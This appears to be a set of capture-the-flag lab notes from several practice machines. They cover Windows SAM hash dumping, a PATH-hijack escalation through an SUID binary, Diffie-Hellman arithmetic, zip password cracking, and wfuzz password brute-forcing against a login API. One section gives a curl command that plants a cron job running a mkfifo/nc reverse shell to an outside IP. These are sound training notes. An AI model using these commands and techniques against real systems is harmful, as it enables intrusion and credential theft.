After getting a shell on some machine using RCE I need to deliver the NTLM hash

In windows, the registry in a binary file format store in ==System32/config/ with name SAM, SECURITY , SYSTEM & Default.==

![](attachment/d056b8c8f38f256caa8ce96352e8b7dd.png)

then I downloaded them from the server:

![](attachment/16635d94a8848bf27fd4653b9226340a.png)

![](attachment/a6d047c3e2fe1414b16561484b406303.png)

After collect those file it need to hash dump to get hash value. Here, “Samdump2” is best tool for hash dump.

![](attachment/9ebb4c90cb9300a77838999162788afa.png)

---

Create our own binary and add it to the path to gain privilege

![](attachment/fd86351322fbce14372db45693bac3f2.png)

![](attachment/38caaf2efacc09a4480da4063f94ef0d.png)

Now path is updated and upon execution of backup binary we’d get root. Let’s run the binary.

![](attachment/492438e417dd55d23ab0f0ec31409a0e.png)

all this because I found in binary file using strings this command

![](attachment/0e18e748ec89acc50ccdb860b6509691.png)

cp command is being executed without absolute path (/bin/cp), that means when this binary get executed, our shell search for “cp” in each directory in the path list to look fo the executable file by that name. Then shell will then run the first matching program it finds.

We can take advantage of this misconfiguration in SUID binary (backup). This is our default path.

---

## Duffle-hellman key exchange

```JavaScript
Still, remember the “Diffie-hellman” comment? I’m trying to google the keyphrase and come across with this simple video.

This video explains how Diffie-hellman key exchange works. There are 3 basic elements in this video which are the prime key, Alice secret key and Bob secret key.

Prime key: 3 mod 17 (Known by everyone, even the eavesdropper) Alice secret key: 15 Bob secret key: 13

Step 1: Alice send the public key Alice public key (A) = (3^15) mod 17 = 6

Step 2: Bob send the public key Bob public key (B) = (3^13) mod 17 = 12

Step 3: Bob and Alice obtain the shared secret key Alice shared key= (bob public key (B) ^ Alice secret key) mod 17 = (12^15) mod 17 = 10 … (1) Bob shared key = (Alice public key (A) ^ Bob secret key) mod 17 = (6^13) mod 17 = 10 … (2)

To unify the equation Since A = (3^15) mod 17, substitute into (2). Bob shared key = (3^15^13) mode 17

Since B = (3^13) mod 17, substitute into (1). Alice shared key = (3^13^15) mode 17

The final equation Shared key = 3^(Alice secret key)^(Bob secret key) mod 17 or Shared key = g^(User 1 secret key)^(User 2 secret key)^…(User N secret key) mod p where g and p are prime keys.

Back to the information given, we have 2 secret keys (a and b), 2 prime key (g and p) and 1 public key (g^c). To get the shared key, we can generate the following equation: Shared key = (g^abc) mod p This shared key will lead us to the secret directory.
```

![](attachment/fc029cfb5da7a9fbb0425350cb1c65ba.png)

![](attachment/b5fdf45374cab25976453ada8cb5ad86.png)

We got the shared key by doing some simple arithmetic on the python shell. However, this is not the directory we wanted. The secret directory holds 128 characters. To do that, simply convert the shared key to string and then break it up.

![](attachment/ccd0b929635a1ac6185cbb0efe273b2a.png)

![](attachment/0e15242f9d8a833589b3561b085fd329.png)
---
Unfortunately, the zip file is password protected. To attempt to access the contents of the file, we can use the zip2john tool to convert the zip file into a hash and then use John the Ripper to crack the hash. This process may reveal the password for the zip file, allowing us to access its contents.

![](attachment/da661075ca1900758ebc98fa791e3b2a.png)
![](attachment/f23f34428e98888b3e79065fc20ffd8f.png)
![](attachment/b045aa8ce0f050d53f2a84d1049226b5.png)
Problem Solved

---
wfuzz with ==Content-Type: application/json== header to fuzz
```
wfuzz -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-45.txt -c -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' --hh 31 -t 50 http://api.motunui.thm:3000/v2/login
```
![](attachment/4b647423e3ad1e8864db54ec5be94c58.png)
![](attachment/24b04f2b4ccd007257e73d7c02b2db10.png)
![](attachment/b67c4e1d4578ce03d3f395b7e2053e0d.png)
Looks like there are no any cronjobs running for user maui. Since we can create a new job, lets try if we can get code execution.
Creating a new job:
I used * * * * * which means the payload runs every minute. You can craft your own cron easily at [Crontab.guru.](https://crontab.guru/)
```
curl http://api.motunui.thm:3000/v2/jobs -XPOST -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k","job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.217 4444 >/tmp/f"}'
```
![](attachment/8ab7fd9b14a7298f66d8b441c3ba6f73.png)
and I got a shell

---
after getting shell on some machine I ran linpeas again and found out that user moana can edit a .service file.
![](attachment/f6cfa5b4b79cd2e7d3b533b61ae3c478.png)
We can edit this file and when the program restarts ==/usr/bin/node /var/www/api.motunui.thm/server.js== command is executed. But even though we can change the content of the file, we do not have permission to reload the **systemd daemon**, which means we can not get code execution as root until we can find a way to reload the daemon.
###### File Permission for /var/www/
I was not very familiar with how exactly this all works, so I began to play with the service and files.
![](attachment/7fd35e3e0e5f80a8202780f0c4d34b53.png)
Since www-data owns all the files, we can easily edit the files. So, lets try editing server.js and check if it is actually reflected on the webserver.

----
